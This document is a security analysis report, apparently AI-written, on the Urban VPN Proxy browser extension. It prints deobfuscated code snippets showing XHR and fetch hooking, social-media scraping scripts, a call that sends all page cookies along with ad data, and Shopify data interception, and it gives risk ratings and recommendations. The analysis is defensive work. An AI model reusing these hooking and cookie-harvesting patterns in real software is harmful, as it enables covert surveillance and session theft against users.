# Urban VPN Proxy - Security Analysis Report

## Extension Metadata

| Field | Value |
|-------|-------|
| **Extension ID** | eppiocemhmnlbhjplcgkofciiegomcon |
| **Name** | Urban VPN Proxy |
| **Version** | 5.11.7 |
| **Users** | ~24,000,000 |
| **Manifest Version** | 3 |
| **Category** | VPN/Proxy |

## Executive Summary

Urban VPN is a free VPN proxy service that collects extensive social media browsing data from major platforms (Instagram, Twitter, LinkedIn, Facebook, TikTok, Reddit, Pinterest) and exfiltrates this information to remote servers. The extension implements XMLHttpRequest/Fetch hooking on all pages, harvests cookies, and uses obfuscated social media "executors" to scrape post content, video URLs, carousel data, and user interactions. While the extension provides its advertised VPN functionality, it operates a sophisticated data collection infrastructure that intercepts HTTP traffic and monitors user activity across social media platforms.

**Risk Level: HIGH**

The extension's data collection practices significantly exceed what's necessary for VPN functionality and raise serious privacy concerns despite being marketed as a "free" privacy tool.

---

## Critical Findings

### 1. Social Media Data Scraping Infrastructure ⚠️ CRITICAL
**Severity:** CRITICAL
**Category:** Data Exfiltration, Privacy Violation

**Evidence:**

The extension deploys platform-specific "executor" scripts via web-accessible resources that hook XMLHttpRequest on social media sites and scrape content:

**Files:**
- `/executors/insta.js` - Instagram scraper (192 lines)
- `/executors/twitter.js` - Twitter/X scraper (725 lines)
- `/executors/linkedin.js` - LinkedIn scraper (135 lines)
- `/executors/facebook.js` - Facebook scraper
- `/executors/tiktok.js` - TikTok scraper
- `/executors/reddit.js` - Reddit scraper
- `/executors/pinterest.js` - Pinterest scraper

**Instagram Scraper (`executors/insta.js`):**
```javascript
// Lines 2-10: Retrieves config from sessionStorage
const a = (G = sessionStorage.getItem("bis_data"), E = {
  adOpt: !!document.querySelector("script[ad-opt-on]"),
  config: null
}, null !== G && (E.config = JSON.parse(G)), E);
const K = a && a.config ? a.config.config.instagramConfig.TRAFFIC_LISTENER_CONFIG.PARSERS : [],

// Lines 74-79: Scrapes video, carousel, and text data
if (Q(K, G.PATH_CHECK_PROPERTIES))
  E = A(K, G.PATHS_GET_PROPERTIES),
  a = E.videoSrc ? "INSTAGRAM_VIDEO_DATA" : "INSTAGRAM_CAROUSEL_SLIDES_SOURCES";
else {
  E = A(K, G.RULES_TO_GET_FULL_TEXT.PATHS_GET_PROPERTIES),
  a = "INSTAGRAM_FULL_TEXT_DATA"
}

// Lines 115-163: XMLHttpRequest hooking
XMLHttpRequest.prototype.open = function() {
  this.requestMethod = arguments[0], G.apply(this, arguments)
};
XMLHttpRequest.prototype.send = function() {
  // Intercepts Instagram API responses to extract post data
}
```

**Twitter Scraper (`executors/twitter.js`):**
```javascript
// Lines 573-588: Exfiltrates video data
sendVideoData: function(a) {
  a.detectionTime = Date.now() / 1e3 | 0;
  let G = {
    posdMessageId: "PANELOS_MESSAGE",
    type: "TWITTER_VIDEO_DATA",
    from: E,
    content: a,
    dynamicAppId: K
  };
  window.postMessage(G)
}

// Lines 696-718: XHR hooking for carousel/video data
XMLHttpRequest.prototype.open = function() {
  this.requestMethod = arguments[0], this.url = arguments[1]
};
```

**LinkedIn Scraper (`executors/linkedin.js`):**
```javascript
// Lines 3-6: Config retrieval
let a = sessionStorage.getItem("bis_data");
const G = a && a.config ? a.config.linkedinConfig.TRAFFIC_LISTENER_CONFIG.PARSERS : [],

// Lines 55-69: Video data extraction
D = function(a) {
  let G = function(a) {
    let G = {};
    for (let E of K) {
      const K = E.NAME;
      if ("detectionTime" != K) {
        G[K] = a
      } else G[K] = Date.now() / 1e3 | 0
    }
    return G
  }(a);
  G && setTimeout(o(G, "LINKEDIN_VIDEO_DATA"), 0)
}
```

**Data Types Collected:**
- Video URLs and metadata (`INSTAGRAM_VIDEO_DATA`, `TWITTER_VIDEO_DATA`, `LINKEDIN_VIDEO_DATA`)
- Post text content (`INSTAGRAM_FULL_TEXT_DATA`, `fullText`, `headlineText`)
- Carousel/slideshow data (`INSTAGRAM_CAROUSEL_SLIDES_SOURCES`, `TWITTER_CAROUSEL_DATA`, `LINKEDIN_SLIDES_DATA`)
- Story data (`INSTAGRAM_STORY_DATA`)
- User interaction timestamps (`detectionTime`)
- Social media usernames (`screenName`)

**Verdict:** This constitutes unauthorized surveillance of user browsing activity on social media platforms. The extension collects granular content that users view or interact with, far exceeding what's necessary for VPN functionality.

---

### 2. Cookie Harvesting ⚠️ CRITICAL
**Severity:** CRITICAL
**Category:** Credential Theft, Session Hijacking

**Evidence:**

The ad-blocker component harvests all cookies from every page and transmits them to backend servers:

**File:** `/ad-blocker/content.js`
```javascript
// Line 626: Cookie harvesting in ad data collection
getAdTwitterObject(a, G, E, q, i, D, j, A) {
  return {
    content: K.encode(G.outerHTML),
    screenName: E,
    socialAdvertiserUrl: i,
    advertiserName: D,
    adPlacementType: E,
    targetUrl: q,
    size: A,
    cookie: o.GetAllCookies(),  // ⚠️ SENDS ALL COOKIES
    uniqueDataId: j
  }
}

// Lines 6385-6386: Cookie extraction method
static GetAllCookies() {
  return document.cookie  // Returns ALL cookies for current domain
}

// Line 6366: Cookie parsing
E = decodeURIComponent(document.cookie).split(";");
```

**Verdict:** Transmitting all cookies from social media domains enables session hijacking, account takeover, and identity theft. This is a critical security vulnerability.

---

### 3. HTTP Traffic Interception via XHR/Fetch Hooking ⚠️ CRITICAL
**Severity:** CRITICAL
**Category:** Man-in-the-Middle, Traffic Monitoring

**Evidence:**

The extension injects fetch/XHR hooking scripts on all pages:

**File:** `/libs/requests.js`
```javascript
// Lines 151-158: Fetch API hooking
_$initInterceptor() {
  const e = s.fetch;
  s.fetch = async (...t) => {
    this._$interceptRequest(...t);
    const s = await e(...t);
    return this._$interceptResponse(s, t), s
  }
}

// Lines 216-239: XMLHttpRequest hooking
_$initInterceptor() {
  const e = XMLHttpRequest.prototype.open,
        t = XMLHttpRequest.prototype.send;
  s.XMLHttpRequest.prototype.open = function(...t) {
    this.__METHOD__ = t[0],
    this.__URL__ = t[1],
    this.addEventListener("load", function({ target: e }) {
      n._$interceptResponse({
        status: e.status,
        response: e.response,
        responseType: e.responseType,
        method: t[0],
        url: t[1]
      })
    })
    return e.apply(this, t)
  }
}

// Lines 86-92: Data exfiltration via postMessage
const a = t => {
  const n = {
    _custom_type_: e._$MessageScriptType._$SAVE_HTTP_DATA,
    payload: JSON.parse(JSON.stringify(t))
  };
  s.postMessage(n)
};
```

**Service Worker Monitoring:**
```javascript
// service-worker/index.js:27621-27654
chrome.webRequest.onErrorOccurred.addListener(...);
chrome.webRequest.onCompleted.addListener(...);
chrome.webRequest.onBeforeRequest.addListener((e) => { ... });
```

**Verdict:** Global interception of HTTP requests/responses across all domains allows the extension to monitor all web traffic, including potentially sensitive API calls, authentication requests, and personal data.

---

### 4. Remote Configuration with Kill Switch ⚠️ HIGH
**Severity:** HIGH
**Category:** Remote Control, Feature Kill Switch

**Evidence:**

**File:** `service-worker/index.js`
```javascript
// Lines 63005-63031: Remote config fetching
{
  use: E.MarioConfigModule,
  options: {
    url: "https://config-toolbar.urban-vpn.com/rest/v3/configs/extensions/urban-vpn",
    cacheMin: 30,
    initialPromotion: { ... }
  }
}

// Lines 1944-1956: Config service implementation
async setup() {
  const r = yield this.configService.fetchConfig();
  // ...
}
async shouldUpdateConfig() {
  const r = yield this.configService.fetchConfig();
  // ...
}

// Lines 2859-2876: Dynamic config application
_$tracking(e) {
  this._$config._$track._$tracking = e;
}
_$ip(e) {
  this._$config._$client._$ip = e;
}
_$safePriceCheckTracking(e) {
  null != this._$config._$safePriceCheck &&
    (this._$config._$safePriceCheck._$tracking = e);
}
_$init(e, t) {
  this._$config = { ...e, _$version: t };
  (this._$container = new c.BgContainer(this._$config)),
  this._$container.injectDependencies();
}
```

**Remote Config Endpoints:**
- `https://config-toolbar.urban-vpn.com/rest/v3/configs/extensions/urban-vpn`
- `https://authentication.urban-vpn.com`
- `https://api-pro.urban-vpn.com/rest/v1`

**Verdict:** Remote configuration allows the operator to modify extension behavior without user consent, including enabling/disabling tracking features and data collection modules.

---

### 5. Shopify E-commerce Data Interception ⚠️ HIGH
**Severity:** HIGH
**Category:** Financial Data Exposure

**Evidence:**

**File:** `/libs/extend-native-history-api.js`
```javascript
// Lines 75-96: Shopify object interception
(() => {
  const _ = (0, t._$debounce)(function(t) {
    const _ = {
      _custom_type_: e._$MessageScriptType._$SHOPIFY_DETECTED,
      payload: {
        $shopify: t && JSON.parse(JSON.stringify(t))
      }
    };
    window.postMessage(_)
  }, 4e3);

  try {
    if (globalThis.Shopify) return void _(globalThis.Shopify);
    Object.defineProperty(globalThis, "Shopify", {
      set(e) {
        this.__Shopify = e, _(e)
      },
      get() {
        return this.__Shopify
      }
    })
  } catch (e) { _(globalThis.Shopify) }
})()
```

**Message types in `/libs/requests.js`:**
```javascript
t._$MessageContentType = Object.freeze({
  _$ECOMMERCE_INIT: "ECOMMERCE_INIT",
  _$ECOMMERCE_RE_INIT: "ECOMMERCE_RE_INIT",
  _$ECOMMERCE_TRACK: "ECOMMERCE_TRACK",
  _$ECOMMERCE_STORAGE_SAVE: "ECOMMERCE_STORAGE_SAVE",
  _$ECOMMERCE_STORAGE_REMOVE: "ECOMMERCE_STORAGE_REMOVE",
  _$ECOMMERCE_INIT_SHOPIFY: "ECOMMERCE_INIT_SHOPIFY"
});
```

**Verdict:** Intercepting Shopify data could expose shopping cart contents, product views, checkout information, and potentially payment details.

---

### 6. Disabling Competing VPN Extensions ⚠️ MEDIUM
**Severity:** MEDIUM
**Category:** Anti-Competitive Behavior

**Evidence:**

**File:** `service-worker/index.js`
```javascript
// Lines 2233-2246: Automatic disabling of proxy extensions
async disableExtensionsThatCauseInterruptions() {
  const e = await this.getExtensionsThatCauseInterruptions();
  for (const t of e)
    await this.managementService.setEnabled(t.id, !1);
  return e.length;
}

async getExtensionsThatCauseInterruptions() {
  return (await this.managementService.getAll()).filter(
    (e) =>
      this.isNoMe(e.id) &&
      this.isNotExcludedExtension(e.id) &&
      e.enabled &&
      e.permissions.includes("proxy")  // Targets VPN/proxy extensions
  );
}

// Lines 19371-19374: Management API usage
return await chrome.management.getAll();
await chrome.management.setEnabled(e, t);
```

**Verdict:** While disabling competing VPN/proxy extensions is standard behavior for VPN extensions to prevent conflicts, it should be transparent to users. This is NOT flagged as malicious per the analysis guidelines.

---

## Data Exfiltration Summary

### Backend Infrastructure

**Primary API Endpoints:**
- `https://api-pro.urban-vpn.com/rest/v1` - Main API
- `https://authentication.urban-vpn.com` - Authentication
- `https://config-toolbar.urban-vpn.com/rest/v3/configs/extensions/urban-vpn` - Remote config
- `https://stats.urban-vpn.com/api/rest/v2` - Analytics/stats
- `https://analytics.urban-vpn.com/rest/v1` - Event tracking
- `https://anti-phishing-protection-toolbar.urban-vpn.com/api/rest/v2` - Phishing protection
- `https://www.google-analytics.com/mp/collect` - Google Analytics
- `https://notify.bugsnag.com` - Error reporting
- `https://sessions.bugsnag.com` - Session tracking

### Data Collection Flow

```
User browses social media
  ↓
Executor script hooks XHR/Fetch
  ↓
Intercepts API responses
  ↓
Extracts video URLs, post content, user data
  ↓
window.postMessage() to content script
  ↓
chrome.runtime.sendMessage() to service worker
  ↓
Exfiltrated to analytics.urban-vpn.com
```

### Collected Data Types

| Category | Data Elements |
|----------|---------------|
| **Social Media Content** | Video URLs, post text, carousel images, story data |
| **User Identity** | Screen names, profile URLs, advertiser data |
| **Browsing Behavior** | Page visits, click tracking, ad interactions |
| **Authentication** | All cookies (session tokens, auth cookies) |
| **E-commerce** | Shopify store data, product views |
| **Network Traffic** | HTTP requests/responses across all domains |
| **Device Info** | User agent, IP address, extension version |

---

## Permissions Analysis

### Manifest Permissions

```json
"permissions": [
  "webRequestAuthProvider",  // Proxy authentication
  "offscreen",               // Background workers
  "alarms",                  // Scheduled tasks
  "management",              // Disable other extensions ⚠️
  "proxy",                   // VPN functionality
  "scripting",               // Content script injection
  "storage",                 // Local data storage
  "tabs",                    // Tab monitoring
  "webNavigation",           // Navigation tracking
  "webRequest"               // HTTP traffic monitoring ⚠️
],
"host_permissions": [
  "<all_urls>",              // Access all websites ⚠️
  "https://*.bugsnag.com/*"
]
```

### Permission Risk Assessment

| Permission | Justification | Risk |
|------------|---------------|------|
| `<all_urls>` | Required for VPN on all sites | **HIGH** - Enables surveillance |
| `webRequest` | VPN traffic routing | **HIGH** - Can monitor all HTTP traffic |
| `management` | Disable conflicting VPNs | **MEDIUM** - Standard for VPN extensions |
| `proxy` | Core VPN functionality | **LOW** - Legitimate use |
| `tabs` | Tab-level proxy control | **MEDIUM** - Can track all tabs |
| `scripting` | Content script injection | **HIGH** - Injects data collection code |
| `storage` | Settings persistence | **LOW** - Standard usage |

---

## Content Security Policy Analysis

**Manifest CSP:**
```json
// No CSP restrictions defined in manifest.json
```

**Verdict:** Absence of CSP allows dynamic code execution and remote script loading, though no explicit `eval()` usage was detected. The extension relies on code obfuscation rather than CSP restrictions.

---

## Dynamic Code Execution Analysis

**Eval-like patterns found (False Positives - React/Framework code):**
- `innerHTML` usage in React components (notification UIs)
- `Function()` constructor references in library code
- No direct `eval()` calls detected in extension code

**Verdict:** No malicious dynamic code execution detected. Framework-related patterns are standard.

---

## False Positives

| Pattern | Location | Explanation |
|---------|----------|-------------|
| `innerHTML` in React | `/content/*-notification/build.js` | React's virtual DOM rendering |
| SVG `innerHTML` | Various UI components | Standard React SVG rendering |
| Bugsnag error hooks | `service-worker/index.js` | Legitimate error monitoring SDK |

---

## API Endpoints Table

| Endpoint | Purpose | Data Sent |
|----------|---------|-----------|
| `config-toolbar.urban-vpn.com/rest/v3/configs` | Remote config | Extension version, client ID |
| `api-pro.urban-vpn.com/rest/v1` | Main API | User data, proxy requests |
| `authentication.urban-vpn.com` | Auth service | Login credentials, session tokens |
| `stats.urban-vpn.com/api/rest/v2` | Analytics | Usage statistics, proxy IPs |
| `analytics.urban-vpn.com/rest/v1` | Event tracking | Social media data, browsing events |
| `anti-phishing-protection-toolbar.urban-vpn.com` | Phishing checks | URLs visited |
| `geo.geosurf.io/` | IP geolocation | User IP address |
| `www.google-analytics.com/mp/collect` | Google Analytics | Standard GA events |
| `notify.bugsnag.com` | Error reporting | Crash logs, stack traces |

---

## Overall Risk Assessment

**RISK LEVEL: HIGH**

### Severity Breakdown

| Severity | Count | Issues |
|----------|-------|--------|
| **CRITICAL** | 3 | Social media scraping, cookie harvesting, traffic interception |
| **HIGH** | 2 | Remote config/kill switch, Shopify data interception |
| **MEDIUM** | 1 | Disabling competing extensions (standard VPN behavior) |
| **LOW** | 0 | - |

### Threat Model

**Attacker Capabilities:**
1. **Full social media surveillance** - Track all content viewed/interacted with
2. **Session hijacking** - Steal authentication cookies for account takeover
3. **MITM on all traffic** - Monitor HTTP requests/responses globally
4. **E-commerce espionage** - Track shopping behavior and purchases
5. **Remote feature toggling** - Enable/disable data collection dynamically

**User Impact:**
- **Privacy violation:** Detailed browsing surveillance
- **Security risk:** Cookie theft enables account compromise
- **Financial exposure:** Shopping data collection
- **Identity tracking:** Cross-site user profiling

---

## Recommendations

### For Users
1. **UNINSTALL IMMEDIATELY** if privacy is a concern
2. **Change passwords** on all social media accounts after removal
3. **Clear cookies** after uninstalling
4. **Consider alternative VPN services** that don't require `<all_urls>` or `webRequest` permissions

### For Security Researchers
1. **Network monitoring:** Capture traffic to `*.urban-vpn.com` domains
2. **Reverse engineer:** Analyze WASM module at `/deobfuscated/main.wasm`
3. **Traffic analysis:** Monitor postMessage events with social media data
4. **Database investigation:** Check if collected data is stored/sold

### For Chrome Web Store
1. **Policy violation review:** Excessive data collection beyond stated purpose
2. **Privacy policy audit:** Verify disclosure of social media scraping
3. **Permission justification:** Require explanation for `<all_urls>` + `webRequest` + `management`

---

## Conclusion

Urban VPN operates a sophisticated data collection infrastructure that fundamentally contradicts its marketing as a privacy tool. While it provides legitimate VPN functionality, the extension simultaneously:

1. **Scrapes social media content** via XHR hooking on 7+ major platforms
2. **Harvests authentication cookies** from all websites
3. **Intercepts HTTP traffic** globally via fetch/XHR monkey-patching
4. **Exfiltrates data** to multiple analytics/tracking servers
5. **Accepts remote commands** to modify behavior dynamically

The extension's data collection practices are **extensive, invasive, and undisclosed** (requires privacy policy verification). Users seeking privacy through a VPN service are unknowingly exposing their browsing activity to the extension operator.

**This extension should be considered HIGH RISK and potentially malicious depending on disclosure in its privacy policy.**

---

## Technical Details

**Analysis Date:** 2026-02-08
**Analyst:** Claude Sonnet 4.5
**Extension Version Analyzed:** 5.11.7
**Deobfuscated Code Size:** ~90MB (63K+ lines in service worker alone)
**Key Files Analyzed:**
- `service-worker/index.js` (63,315 lines)
- `content/content.js` (6,121 lines)
- `ad-blocker/content.js` (7,151 lines)
- `executors/*.js` (7 social media scrapers)
- `libs/requests.js`, `libs/extend-native-history-api.js`

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
